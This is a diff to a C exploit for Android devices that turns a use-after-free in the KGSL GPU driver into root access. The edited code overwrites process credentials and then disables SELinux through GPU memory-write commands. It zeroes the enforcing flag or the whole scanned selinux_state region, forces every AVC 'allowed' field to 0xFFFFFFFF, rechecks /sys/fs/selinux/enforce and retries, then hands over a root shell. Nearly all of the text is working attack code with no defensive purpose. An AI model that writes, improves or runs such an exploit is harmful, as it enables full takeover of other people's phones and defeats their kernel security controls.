@@ -445,9 +445,10 @@ int main(int argc, char **argv) {
     flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
     printf("[+] Cred overwrite done\n");
 
-    // ===== Phase 9: Dynamic SELinux enforcing detection and zeroing =====
-    printf("[*] Phase 9: Dynamic detection of SELinux enforcing flag\n");
-    // Read selinux_state area
+    // ===== Phase 9: Aggressive SELinux disabling =====
+    printf("[*] Phase 9: Aggressive SELinux disabling\n");
+
+    // 1) Read selinux_state area
     memset(ib_m, 0, 0x10000);
     memset(dst_m, 0, 0x1000);
     uint32_t *cmd = (uint32_t *)ib_m;
@@ -470,20 +471,17 @@ int main(int argc, char **argv) {
 
     uint32_t *state_data = (uint32_t *)dst_m;
     int enforcing_offset = -1;
-    // Look for a 4-byte value that is 1 (enforcing) or 0 (permissive) and is in a plausible location
-    // Typically enforcing flag is at offset 0x0, 0x4, or 0x8 in selinux_state
     for (int i = 0; i < SELINUX_STATE_SCAN_SIZE / 4; i++) {
-        uint32_t val = state_data[i];
-        if (val == 1 || val == 0) {
-            // Check if surrounding bytes are also plausible (not random pointer)
-            int zero_count = 0;
+        if (state_data[i] == 1) {
+            // Check surrounding zeros to confirm it's a flag
+            int zero_around = 0;
             for (int j = -2; j <= 2; j++) {
                 int idx = i + j;
                 if (idx >= 0 && idx < SELINUX_STATE_SCAN_SIZE / 4) {
-                    if (state_data[idx] == 0) zero_count++;
+                    if (state_data[idx] == 0) zero_around++;
                 }
             }
-            if (zero_count >= 3) {
+            if (zero_around >= 3) {
                 enforcing_offset = i * 4;
                 break;
             }
@@ -491,7 +489,7 @@ int main(int argc, char **argv) {
     }
 
     if (enforcing_offset >= 0) {
-        printf("  Found enforcing flag at offset 0x%x (value = %u)\n", enforcing_offset, state_data[enforcing_offset/4]);
+        printf("  Found enforcing flag at offset 0x%x (value = 1)\n", enforcing_offset);
         // Write 0 to that offset
         uint64_t enforcing_addr = selinux_state_addr + enforcing_offset;
         memset(ib_m, 0, 0x10000);
@@ -510,97 +508,132 @@ int main(int argc, char **argv) {
         flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
         printf("[+] SELinux enforcing flag zeroed\n");
     } else {
-        printf("[-] Could not find enforcing flag, trying AVC bypass fallback\n");
-        // Fallback: try AVC overwrite if available, or zero first 0x20
-        // We already did AVC scan? Not yet; we'll do it now.
-        printf("[*] Phase 9b: Attempting AVC bypass as fallback\n");
-        uint64_t avc_vas[256];
-        int n_avc = 0;
-        uint64_t avc_scan_start = UAF_ADDR;
-        for (uint64_t va = avc_scan_start; va < end_va && n_avc < 256; va += 0x1000) {
-            if (((va - avc_scan_start) & 0xFFFFF) == 0) printf(".");
-            memset(ib_m, 0, 0x10000);
-            memset(dst_m, 0, 0x1000);
-            cmd = (uint32_t *)ib_m;
-            dw = 0;
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-            for (int i = 0; i < AVC_SCAN_DWORDS; i++) {
-                uint32_t dl, dh, sl, sh;
-                split64(dst_ga + i * 4, &dl, &dh);
-                split64(va + i * 4, &sl, &sh);
-                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-                cmd[dw++] = sl; cmd[dw++] = sh;
-            }
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-            __sync_synchronize();
-            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
-            if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
-            __sync_synchronize();
-            uint32_t *d = (uint32_t *)dst_m;
-            int ahits = 0;
-            for (int ofs = 0; ofs < 4032; ofs += 72) {
-                int idx = ofs / 4;
-                if (idx + 13 >= AVC_SCAN_DWORDS) break;
-                uint32_t ssid = d[idx];
-                uint32_t tsid = d[idx+1];
-                uint32_t tclass = d[idx+2] & 0xFFFF;
-                if (ssid > 0 && ssid < 10000 && tsid > 0 && tsid < 10000 &&
-                    tclass > 0 && tclass < 1000) {
-                    ahits++;
-                }
-            }
-            if (ahits >= 3) {
-                dump_avc_page(va, d, ahits > 20 ? 20 : ahits);
-                avc_vas[n_avc] = va;
-                n_avc++;
+        printf("  Could not find enforcing flag; zeroing first 0x%x bytes of selinux_state\n", SELINUX_STATE_SCAN_SIZE);
+        // Zero entire scanned area
+        memset(ib_m, 0, 0x10000);
+        cmd = (uint32_t *)ib_m;
+        dw = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int off = 0; off < SELINUX_STATE_SCAN_SIZE; off += 4) {
+            uint64_t addr = selinux_state_addr + off;
+            uint32_t al2, ah2;
+            split64(addr, &al2, &ah2);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
+            cmd[dw++] = al2; cmd[dw++] = ah2;
+            cmd[dw++] = 0;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+            wait_timestamp(kgsl_fd, ctx_id, ts);
+        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+        printf("[+] Zeroed %d bytes of selinux_state\n", SELINUX_STATE_SCAN_SIZE);
+    }
+
+    // 2) Additional: try to overwrite selinux_enforcing_boot (if offset known)
+    // but we don't have exact offset, so skip
+
+    // 3) AVC bypass as final fallback (in case selinux_state write didn't work)
+    printf("[*] Phase 9b: AVC bypass fallback (overwrite allowed fields)\n");
+    uint64_t avc_vas[256];
+    int n_avc = 0;
+    uint64_t avc_scan_start = UAF_ADDR;
+    for (uint64_t va = avc_scan_start; va < end_va && n_avc < 256; va += 0x1000) {
+        if (((va - avc_scan_start) & 0xFFFFF) == 0) printf(".");
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, 0x1000);
+        cmd = (uint32_t *)ib_m;
+        dw = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int i = 0; i < AVC_SCAN_DWORDS; i++) {
+            uint32_t dl, dh, sl, sh;
+            split64(dst_ga + i * 4, &dl, &dh);
+            split64(va + i * 4, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
+        if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
+        __sync_synchronize();
+
+        uint32_t *d = (uint32_t *)dst_m;
+        int ahits = 0;
+        for (int ofs = 0; ofs < 4032; ofs += 72) {
+            int idx = ofs / 4;
+            if (idx + 13 >= AVC_SCAN_DWORDS) break;
+            uint32_t ssid = d[idx];
+            uint32_t tsid = d[idx+1];
+            uint32_t tclass = d[idx+2] & 0xFFFF;
+            if (ssid > 0 && ssid < 10000 && tsid > 0 && tsid < 10000 &&
+                tclass > 0 && tclass < 1000) {
+                ahits++;
             }
         }
-        printf("\n[*] Found %d AVC pages\n", n_avc);
-        if (n_avc > 0) {
-            printf("[*] Overwriting AVC allowed fields\n");
-            for (int p = 0; p < n_avc; p++) {
-                memset(ib_m, 0, 0x10000);
-                cmd = (uint32_t *)ib_m;
-                dw = 0;
-                cmd[dw++] = cp_type7(CP_NOP, 0);
-                for (int slot = 0; slot < 4032; slot += 72) {
-                    uint64_t allowed_addr = avc_vas[p] + slot + 12;
-                    uint32_t al2, ah2;
-                    split64(allowed_addr, &al2, &ah2);
-                    cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
-                    cmd[dw++] = al2; cmd[dw++] = ah2;
-                    cmd[dw++] = 0xFFFFFFFF;
-                }
-                cmd[dw++] = cp_type7(CP_NOP, 0);
-                __sync_synchronize();
-                if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
-                    wait_timestamp(kgsl_fd, ctx_id, ts);
-            }
-            flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
-            printf("[+] AVC allowed overwritten (SELinux effectively permissive)\n");
-        } else {
-            printf("[-] No AVC pages found, fallback to zeroing first 0x20 of selinux_state\n");
-            // Last resort: zero first 0x20 bytes
+        if (ahits >= 3) {
+            dump_avc_page(va, d, ahits > 20 ? 20 : ahits);
+            avc_vas[n_avc] = va;
+            n_avc++;
+        }
+    }
+    printf("\n[*] Found %d AVC pages\n", n_avc);
+
+    if (n_avc > 0) {
+        printf("[*] Overwriting AVC allowed fields\n");
+        for (int p = 0; p < n_avc; p++) {
             memset(ib_m, 0, 0x10000);
             cmd = (uint32_t *)ib_m;
             dw = 0;
             cmd[dw++] = cp_type7(CP_NOP, 0);
-            for (int off = 0; off < 0x20; off += 4) {
-                uint64_t addr = selinux_state_addr + off;
+            for (int slot = 0; slot < 4032; slot += 72) {
+                uint64_t allowed_addr = avc_vas[p] + slot + 12;
                 uint32_t al2, ah2;
-                split64(addr, &al2, &ah2);
+                split64(allowed_addr, &al2, &ah2);
                 cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
                 cmd[dw++] = al2; cmd[dw++] = ah2;
-                cmd[dw++] = 0;
+                cmd[dw++] = 0xFFFFFFFF;
             }
             cmd[dw++] = cp_type7(CP_NOP, 0);
             __sync_synchronize();
             if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
                 wait_timestamp(kgsl_fd, ctx_id, ts);
-            flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
-            printf("[+] Fallback: zeroed first 0x20 bytes of selinux_state\n");
         }
+        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+        printf("[+] AVC allowed overwritten\n");
+    } else {
+        printf("[-] No AVC pages found\n");
+    }
+
+    // Verify SELinux status by reading /sys/fs/selinux/enforce
+    int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
+    if (enforce_fd >= 0) {
+        char val;
+        if (read(enforce_fd, &val, 1) == 1) {
+            printf("[*] SELinux enforce = %c\n", val);
+            if (val == '1') {
+                // Still enforcing, try one more direct write to selinux_state+0
+                printf("  Still enforcing; trying to zero selinux_state+0 explicitly\n");
+                memset(ib_m, 0, 0x10000);
+                cmd = (uint32_t *)ib_m;
+                dw = 0;
+                cmd[dw++] = cp_type7(CP_NOP, 0);
+                uint64_t addr0 = selinux_state_addr;
+                uint32_t al0, ah0;
+                split64(addr0, &al0, &ah0);
+                cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
+                cmd[dw++] = al0; cmd[dw++] = ah0;
+                cmd[dw++] = 0;
+                cmd[dw++] = cp_type7(CP_NOP, 0);
+                __sync_synchronize();
+                if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+                    wait_timestamp(kgsl_fd, ctx_id, ts);
+                flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+                printf("  Zeroed selinux_state+0\n");
+            }
+        }
+        close(enforce_fd);
     }
 
     printf("[*] Phase 10: Cache eviction\n");
@@ -624,7 +657,7 @@ int main(int argc, char **argv) {
         for (int i = 0; i < n_spray; i++)
             if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
         while (waitpid(-1, NULL, WNOHANG) > 0);
-        printf("\n  # ROOT SHELL (uid=0, SELinux should be permissive) - type exit to quit\n  # ");
+        printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
         fflush(stdout);
         waitpid(winner, NULL, 0);
         printf("[-] Root shell exited\n");
